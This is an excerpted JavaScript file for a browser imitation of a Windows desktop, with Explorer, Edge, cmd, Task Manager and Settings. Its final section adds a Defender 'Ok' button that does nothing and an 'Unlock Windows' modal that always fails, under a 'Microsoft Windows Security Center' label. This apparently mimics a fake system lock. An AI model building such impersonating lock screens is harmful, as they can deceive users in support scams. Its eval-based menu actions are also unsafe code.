                              ${(this.icons.close ? `<span class='button button-close' data-bs-toggle='tooltip' title='Close'>${this.closeIcon}</span>` : "")}
                        </div>
                  </div>` + eval(`new App_${ucwords(this.app)}({ wid: '${this.wid}', path: '${this.secondary_args.path}' })`).outerHTML
      }
      ...
      init() {
            ...
            setTimeout(() => {
                  if($("w-taskmanager").length && window["tasklist"]) $("w-taskmanager .app-list").after(window["tasklist"].draw()) // Update taskmanager
            })
      }
      ...
      maximizeWindow(storeOldState = true) {
            ...
            this.pos = { h:`calc(100% - ${taskbar_height}px - 8px)`, w:"100%", x:0, y:0 }

            $(`#${this.wid} .button-max`).removeClass("button-max").addClass("button-restore").attr("w_title", "Restore")
            reinit_tooltips()
            this.redrawWindow()
      }
      ...
      restoreWindow() {
            this.state = 1
            $(this).addClass("transition").removeClass("maximized").attr("state", this.state)
            this.pos = this.oldpos

            $(`#${this.wid} .button-restore`).removeClass("button-restore").addClass("button-max")
      ...
      closeWindow() {
            ...
            $("w-taskbar").find(`w-taskbar-button[data-app=${this.app}]:not([data-pinned])`).remove() 
      ...
      static spawnWindow(app, args = {}) {
            ...
            let newX = ($("w-window:last-of-type").length ? $("w-window:last-of-type")[0].offsetLeft + 50 : defPos)
            let newY = ($("w-window:last-of-type").length ? $("w-window:last-of-type")[0].offsetTop + 50 : defPos)
      ...
      eventHandlers() {
            ...
            $(this).on("click", ".tray", function(e) {
                  if(window["systray_menu"]) {
                        ...
                        window["systray_menu"] = new SystemTrayMenu({ pos: { y:0, x:$(this).offset().left }})
            ...
            $(this).on("click", ".time", function(e) {
                  if(window["notifications_menu"]) {
                        ...
                        window["notifications_menu"] = new NotificationsBar({ pos: { y:0, x:0 }})
...
class SystemTrayMenu extends HTMLElement {
      ...
      init() {            
            setTimeout(() => {
                  this.pos.y = (docHeight - $(window["taskbar"]).height()) - $(this).height() * 1.175
      ...
      eventHandlers() {
            ...
            // Click outside of context
            $("*").on("click contextmenu", function(e) {
                  if($(window["systray_menu"]).length && !hasParents(e, ".tray") && !hasParents(e, "w-systemtray-menu")) {
                        _this.closeMenu()
                        //$(this).off()
                  }
                  e.preventDefault()
...
class SystemTrayOption extends HTMLElement {
      ...
      html() {
            return `
                  <div class="upper ${(this.active ? "active" : "")}" ${(this.active ? "disabled" : "")}>
                        <div class="icon"><img src="${this.icon}"></div>
                        ${(this.split ? "<div class=\"arrow\"><span>&rsaquo;</span></div>" : "")}
                  </div>
...
class NotificationsBar extends HTMLElement {
      ...
      init() {
            setTimeout(() => {
                  this.pos.y = (docHeight - $(window["taskbar"]).height() * 2.25) - $(this).height()
      ...
      closeMenu() {
            ...
            $(window["notifications_menu"]).css({"animation": "slideFadeRight .3s forwards"})
            setTimeout(() => {
                  closeToolTips()
                  _this.remove()
            }, 200)
      ...
      eventHandlers() {
            ...
            // Click outside of context
            $("*").on("click contextmenu", function(e) {
                  if($(window["notifications_menu"]).length && e.target.localName != "w-notifications-bar" && !hasParents(e, "w-notifications-bar")
      ...
      html() {
            ...
            if(this.top_buttons) {
                  ...
                  this.top_buttons.forEach((b) => {
                        if(b.text === "---") {
                              ...
                              cxt += `<div class="top-menu-item" onclick="eval(${b.action})" ${(b.disabled ? "disabled" : "")}
                              data-bs-toggle="tooltip" title="${b.tooltip}">
                                    ` + (b.icon ? `<img src="${transparent()}" style="background-image: url(${b.icon})">` : "") + `
                              </div>`
                        }
                  })
                  cxt += `</div>`
            ...
            this.buttons.forEach((b) => {
                  if(b.text === "---") {
                        ...
                        cxt += `<div class="menu-item ${(b.invert == false ? "no-invert" : "invert")}" onclick="eval(${b.action})" ${(b.disabled ? "disabled" : "")}>
                              <div class="inner">
                                    ` + (b.icon ? `<img src="${transparent()}" style="background-image: url(${b.icon})">` : "") + `
                                    ${b.text}
                              </div>
                              ${(b.more_buttons ? "<span class=\"more\">â€º</span>" : "")}
                        </div>`
                  }
            })
      ...
      init(animate) {
            setTimeout(() => {
                  if(this.taskbar_context) {
                        ...
                        if(this.pos.x > $(window).width() - $(this).width()) this.pos.x -= $(this).width() / 3
                        if(this.pos.x < 0 + ($(window).width() / 4)) this.pos.x += $(this).width() / 3
                        ...
                        if(this.pos.x > $(window).width() - $(this).width()) this.pos.x -= $(this).width()
                        if(this.pos.y > $(window).height() - $(this).height()) this.pos.y -= $(this).height()
...
class App_Getstarted extends HTMLElement {
      ...
      init() {
            ...
            setTimeout(() => {
                  ...
                  $(_this).parent().find(".icon").css({ "opacity": "0", "margin-right": "-1em" })
            }, 1)
      }
}
...
class GetStartedPanes extends HTMLElement {
            ...
            switch(this.slide) {
                  case 1:
                        res = `<div class="slide s${this.slide}">
                              <div class="left">
                                    <h1>Hi there!</h1><br>
                                    Microsoft Windows Security Center<br>
      ...
      eventHandlers() {
            ...
            $(document).on("click", "w-getstarted .statusbar .nav-btn.home", function() {
                  _this.slide = 1
                  $(_this).fadeOut(500, function() {
                        $(_this).html(_this.html()).fadeIn()
                  })
            ...
            $(document).on("click", "w-getstarted .statusbar .nav-btn.next", function() {
                  _this.slide++
                  $(_this).fadeOut(500, function() {
                        $(_this).html(_this.html()).fadeIn()
                  })
            })
            $(document).on("click", "w-getstarted .statusbar .nav-btn.prev", function() {
                  _this.slide--
                  $(_this).fadeOut(500, function() {
                        $(_this).html(_this.html()).fadeIn()
                  })
      ...
      updateNextPrev(num, maxnum) {
            $("w-getstarted .statusbar .nav-btn.next").attr("disabled", !(num < maxnum))
...
class ExplorerAddressBar extends HTMLElement {
      ...
      eventHandlers() {
            ...
            $(document).on("mousedown", ($e) => {
                  if(!$(this)[0].contains($e.target) && $(_this).find(".addressbar-input").is(":visible")) {
...
class ExplorerNavigationBar extends HTMLElement {
      ...
      html() {
            let res = [
                  ...
                  new ExplorerNavigationBarItem({ icon: base64_onedrive, text: "Microsoft OneDrive", dropdown: true }),
                  "<hr>",
                  new ExplorerNavigationBarItem({ icon: base64_desktop_small, text: "Desktop" }),
                  new ExplorerNavigationBarItem({ icon: base64_downloads_small, text: "Downloads" }),
                  new ExplorerNavigationBarItem({ icon: base64_documents_small, text: "Dokumente" }),
                  new ExplorerNavigationBarItem({ icon: base64_pictures_small, text: "Bilder" }),
                  new ExplorerNavigationBarItem({ icon: base64_music_small, text: "Musik" }),
                  new ExplorerNavigationBarItem({ icon: base64_videos_small, text: "Videos" }),
                  "<hr>",
                  new ExplorerNavigationBarItem({ icon: base64_mycomputer_small, text: "My Computer", dropdown: true }),
                  new ExplorerNavigationBarItem({ icon: base64_network_small, text: "Network", dropdown: true })
            ]
            return res
      }
...
class ExplorerNavigationBarItem extends HTMLElement {
      ...
      html() {
            return (this.dropdown ? "<span class='dropdown'>&#x203A;</span>" : "")+`<img src="${base64_transparent}" style="background-image: url(${this.icon})"> ${this.text}`
      }
...
customElements.define("w-explorer-navigation-bar-item", ExplorerNavigationBarItem)
...
class ExplorerPane extends HTMLElement {
      ...
      html() {
            ...
            if(this.path == "mycomputer") {
                  ...
                  $(this).parent().find(".toggle").html("<span class='dropdown'>&#x203A;</span> Devices and drives")
            }
            ...
            if(this.path == "documents") {
                  let cxt = {
                        ...
                        buttons: [
                              { text: "Öffnen", icon: base64_icon_fileexplorer },
                              { text: "In neuem Fenster öffnen", icon: cxt_openinnewwindow },
                              { text: "An Schnellzugriff anheften", icon: cxt_pin },
                              { text: "An Start anheften", icon: cxt_pin },
                              { text: "Eigenschaften", icon: cxt_properties },
                              { text: "---" },
                              { text: "Weitere Optionen anzeigen", icon: cxt_showmore },
                        ]
                  }
                  res = [
                        new ExplorerIcon({ icon: base64_icon_desktop, text: "Desktop", subtext: "Lokal gespeichert", cxt: cxt }),
                        new ExplorerIcon({ icon: base64_icon_downloads, text: "Downloads", subtext: "Lokal gespeichert", cxt: cxt }),
                        new ExplorerIcon({ icon: base64_icon_documents, text: "Dokumente", subtext: "Lokal gespeichert", cxt: cxt }),
                        new ExplorerIcon({ icon: base64_icon_pictures, text: "Bilder", subtext: "Lokal gespeichert", cxt: cxt }),
                        new ExplorerIcon({ icon: base64_icon_music, text: "Musik", subtext: "Lokal gespeichert", cxt: cxt }),
                        new ExplorerIcon({ icon: base64_icon_videos, text: "Videos", subtext: "Lokal gespeichert", cxt: cxt })
                  ]
            }
            ...
            if(this.path == "recyclebin") {
                  ...
                  $(this).parent().find("w-explorer-pane").before("<div class='folderempty'>This folder is empty</div>")
...
class ExplorerIcon extends HTMLElement {
      ...
      html() {
            return `
                  ...
                  <span>
                        ${this.text}
                        ${(this.progress ? "<div class='progress'><div style='width:30px'></div></div>" : "")}
...
class App_Msedge extends HTMLElement {
      ...
      init() {
            ...
            setTimeout(() => {
                  ...
                  $(`#${this.wid}`).find(".msedge_tabs").append(`<w-edge-tab data-text="Bing" data-icon="${base64_search}"></w-edge-tab>`)
            }, 1)
      }
      ...
      eventHandlers() {
            ...
            $(document).on("click", `#${_this.wid} .refresh`, function(e) {
                  $(`#${_this.wid} .browser`).attr("src", function(i, val) { return val })
            })
            ...
            $(document).on("keyup", `#${_this.wid} .search input`, function(e) {
                  if(e.which === 13) {
                        ...
                        if(strstr(url, "http://") || strstr(url, "https://")) {
                              ...
                              $(`#${_this.wid} .browser`).attr("src", `https://www.bing.com/search?q=${url}`)
                        }
                  }
            })            
      }
...
class App_Cmd extends HTMLElement {
      ...
      init() {
            ...
            setTimeout(() => {
                  ...
                  $(_this).find(".cmd")[0].selectionStart = $(_this).find(".cmd").val().length
            }, 1)
      }
      ...
      eventHandlers() {
            ...
            $(this).on("keyup", ".cmd", function(e) {
                  ...
                  if(keycode == 13) {                     
                        ...
                        if(str.trim().endsWith(".exe")) { // Run apps
                        ...
                        $(this).val($(this).val() + `'${str.trim()}' is not recognized as an internal or external command,\noperable program or batch file.\n`) // About
                        reset(startText)
                  }
            })
      }
...
class App_Taskmanager extends HTMLElement {
      ...
      init() {
            ...
            setTimeout(() => {
                  ...
                  $(`#${this.wid} .title`).after(`<div class="handle taskman_search"><input type="search" placeholder="Type a name, publisher, or PID to search" style="background-image:url(${base64_search1_r})"></div>`)
      ...
      eventHandlers() {
            ...
            $(document).on("click", "w-window:has(w-taskmanager) [data-pane]", function() {
                  let p = $(this).attr("data-pane")
                  $("w-window:has(w-taskmanager) .main").html(new TaskManPane({pane: p}).draw())
            ...
            $(() => {
                  ...
                  $(document).on("click", "#taskman_view", function() {
                        if($("w-window:has(w-taskmanager)").width() > 850) $(_this).parent().find(".sidebar").toggleClass("min")
                  })

                  // Simulate percentages
                  setInterval(() => {
                        $(".processes_list .headers .memory h6").html(Math.floor(Math.random() * 20) + 20 + "%")
                        $(".processes_list .headers .cpu h6").html(Math.floor(Math.random() * 15) + 7 + "%")
                  }, 1000)
      ...
      draw() {
            ...
            this.buildList().forEach((task, index) => {
                  res += `<div class="row task-item" data-wid="${task.wid}">
                        ...
                        <div class="cell"></div>
                        <div class="cell">${Math.random().toFixed(2) + "%"}</div>
                        <div class="cell">${(Math.floor(Math.random() * 0) + Math.random()).toFixed(2)}MB</div>
            ...
            $(document).on("contextmenu", "w-taskmanager .task-item", function(e) {
                  ...
                  if(!window["taskman_context"]) {
                        window["taskman_context"] = new ContextMenu({
                              ...
                              taskbar_context: false,
                              buttons: [
                                    { text: "&emsp;End Task&emsp;", action: `$(\`#${el.attr("data-wid")}\`)[0].closeWindow()` }
                              ]
                        })
...
constructor(args) {
      super()
      this.chart = this.to = ""
      this.dataLength = ((args ? args.dataLength : $(this).attr("data-length")) ?? 30)
      this.updateInterval = ((args ? args.updateInterval : $(this).attr("data-update-interval")) ?? 1000)
      this.peakRangeMin = ((args ? args.peakRangeMin : $(this).attr("data-peak-min")) ?? 80)
      this.peakRangeMax = ((args ? args.peakRangeMax : $(this).attr("data-peak-max")) ?? 100)
      this.color = ((args ? args.color : $(this).attr("data-color")) ?? "0, 111, 145")
      this.refresh()
}
...
generateData(length) {
      ...
      for(var i = 0; i < length; i++) {
            data.push(Math.random() * (this.peakRangeMax - this.peakRangeMin) + this.peakRangeMin)
      }
      return data
}
...
updateData() {
      ...
      this.chart.data.datasets[0].data.push(Math.random() * (this.peakRangeMax - this.peakRangeMin) + this.peakRangeMin)
      this.chart.update()
}
...
class App_Settings extends HTMLElement {
      ...
      applyTheme() {
            ...
            if(window["theme"] == "dark") {
                  parent.css({
                        "background": "#2B2E33DD"
                  }).find(".icon, .settings_burger").css({
                        "filter": "invert(100%)"
                  })
                  parent.find(".wallpaper-preview").css({ "background-image": `url(${wallpaper_dark})` })
            }else{
                  parent.css({
                        "background": "rgba(255,255,255,0.9)"
                  }).find(".icon, .settings_burger").css({
                  ...
                  parent.find(".wallpaper-preview").css({ "background-image": `url(${wallpaper_light})` })
            }
      }
      ...
      init() {
            ...
            if(!parent.find(".settings_burger").length) parent.find(".icon").after(`<div class="settings_burger" style="background-image:url(${taskman_view})"></div>`)
      }
      ...
      eventHandlers() {
            ...
            $(document).on("click", "w-settings-sidebar-item", function(e) {
                  ...
                  setTimeout(() => { $(_this).find(`.menu-${$(this).attr("data-menu")}`).show("slide", { direction: "down" }) })
...
// ==================== UNLOCK WINDOWS FUNCTIONALITY ====================

// Handle "Ok" button - does nothing
document.addEventListener('DOMContentLoaded', function() {
    const okBtn = document.getElementById('defender-ok-btn');
    if (okBtn) {
        okBtn.addEventListener('click', function(e) {
            e.stopPropagation();
            // Button does nothing
            console.log('Ok button clicked - no action');
        });
    }
    
    // Handle "Unlock Windows" button - opens the unlock modal
    const unlockBtn = document.getElementById('unlock-windows-btn');
    if (unlockBtn) {
    ...
    // Handle close button on unlock modal
...
let unlockAutoCloseTimeout = null;

function openUnlockWindow() {
    const unlockModal = document.getElementById('unlock-modal');
    const loadingScreen = document.getElementById('unlock-loading');
    const failedScreen = document.getElementById('unlock-failed');
    
    if (!unlockModal) return;
    
    // Clear any existing timeout
    if (unlockAutoCloseTimeout) {
        clearTimeout(unlockAutoCloseTimeout);
    }
    ...
    // After 3 seconds, show failure message
    setTimeout(function() {
        loadingScreen.style.display = 'none';
        failedScreen.style.display = 'flex';
    }, 3000);
    
    // Auto-close after 32 seconds
    unlockAutoCloseTimeout = setTimeout(function() {
        closeUnlockWindow();
    }, 32000);
}
